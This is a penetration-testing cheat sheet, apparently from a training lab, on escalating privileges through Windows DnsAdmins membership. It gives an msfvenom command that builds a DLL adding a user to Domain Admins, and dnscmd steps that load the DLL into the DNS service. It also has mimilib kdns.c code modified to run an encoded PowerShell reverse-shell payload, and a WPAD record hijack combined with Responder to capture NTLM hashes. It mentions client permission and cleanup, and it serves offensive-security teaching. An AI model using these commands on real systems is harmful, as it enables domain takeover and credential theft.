### Content

- [Overview](#overview)
- [Checking user's Permissions Over a Service](#checking-user's-permissions-over-a-service)
- [DnsAdmins Abuse Through Malicious DLL](#dnsadmins-abuse-through-malicious-dll)
- [Using Mimilib.dll](#using-mimilib.dll)
- [Cleaning Up](#cleaning-up)
- [Creating a WPAD Record](#creating-a-wpad-record)

---
#### Overview

Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL.

[Details and Mitigations](https://adsecurity.org/?p=4064)

- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path.
- When a member of the `DnsAdmins` group runs `dnscmd.exe /config /serverlevelplugindll <dll path>`, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded.
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
---
#### Checking user's Permissions Over a Service

```CMD
C:\> wmic useraccount where name="netadm" get sid
SID
S-1-5-21-669053619-2741956077-1013132368-1109

C:\> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

Per this [note](%2E%2E/%2E%2E/%2E%2E/%2E%2E/Operating%20Systems/Windows/SDDL), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

---
### DnsAdmins Abuse Through Malicious DLL

generate a malicious DLL to add a user `netadm` to the `domain admins` group using `msfvenom` and transfer it to the victim machine.

```bash
$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

After confirming group membership in the DnsAdmins group, we can run the command to load a custom DLL.

```CMD
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
# Specify the full path to the custom DLL.
```

> After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell.
> 
> Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.

Restart the DNS service

```PowerShell
PS C:\> sc stop dns
PS C:\> sc start dns
```

Confirming New Group Membership

```PowerShell
C:\> net group "Domain Admins" /dom

Members
------------------------------------------------
Administrator            netadm
```

> Sign out and Sign in again to let the user token to be edited with the new privileges.

---
### Using Mimilib.dll

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

```C
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e <<<PAYLOAD>>>");
	}
	return ERROR_SUCCESS;
}
```

---
### Cleaning Up

As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.

> These steps must be taken from an elevated console with a local or domain admin account.

The first step is confirming that the `ServerLevelPluginDll` registry key exists.
Until our custom DLL is removed, we will not be able to start the DNS service again correctly.

``` CMD
C:\> reg query \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
....
 ServerLevelPluginDll    REG_SZ    adduser.dll
....
```

Use the `reg delete` command to remove the key that points to our custom DLL. Then start up the DNS service again.

```CMD
C:\> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
C:\> sc.exe start dns
```

---
### Creating a WPAD Record

- **WPAD (Web Proxy Auto-Discovery Protocol):** Automatically configures proxy settings on client machines.
- **Global Query Block List:** Prevents clients from resolving dangerous names like `wpad` and `isatap`.
- **DnsAdmins Group:** Members can modify DNS settings on the domain DNS server.

```TXT
+-------------------+               +-------------------------+
|   Attacker        |               |  DNS Server (dc01)      |
|  IP: 10.10.14.3   |               |                         |
|  DnsAdmins group  |               +-------------------------+
|  Runs Responder   |                       ▲
+--------+----------+                       |
         |                                  |
         | 1. Disable global block list     |
         +--------------------------------->|
         |                                  |
         | 2. Create 'wpad' A record        |
         +--------------------------------->|
                                            |
                                            ▼
                                    DNS now resolves 'wpad' → 10.10.14.3
                                            ▲
                                            |
+--------------------------+                |
| Victim Client            |                |
| Uses WPAD (default)      |                |
+--------------------------+                |
         |                                  |
         | 3. Client queries for 'wpad' ----+
         |                                  |
         | 4. DNS returns attacker IP       |
         |                                  |
         | 5. Client sends HTTP to wpad     |
         |    to fetch proxy.pac            |
         +------------> attacker            |
			                                |
                         (Responder/Inveigh captures NTLM)

```

**(1)** To set up this attack, we first disabled the global query block list:

```PowerShell
C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

**(2)** Next, we add a WPAD record pointing to our attack machine.

```PowerShell
C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

(3) Responder `sudo responder -I tun0` or Inveigh `Invoke-Inveigh -WPADResponder Y -NBNS Y -mDNS Y -ConsoleOutput Y`

